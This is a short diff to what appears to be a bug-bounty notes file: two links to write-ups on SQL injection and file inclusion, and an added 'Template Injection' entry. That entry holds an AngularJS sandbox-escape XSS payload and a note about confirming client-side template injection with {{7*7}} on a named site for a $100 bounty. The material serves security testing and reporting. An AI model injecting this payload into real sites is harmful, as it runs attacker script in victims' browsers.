@@ -1,2 +1,7 @@
 https://buer.haus/2015/01/15/yahoo-root-access-sql-injection-tw-yahoo-com/
 https://medium.com/@zomasec/how-i-found-22-lfi-in-the-same-program-using-automation-tricks-3ea303d24f4a
+
+Template Injection
+18	Template Injection	xss payload: {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}			"Bug : CSTI 
+Context : well I got https://shivang .com/forms/forgot-password?email={{7*7}} just entered 7*7 checked in inspect element got 49 reported it. Got 100$"												
+
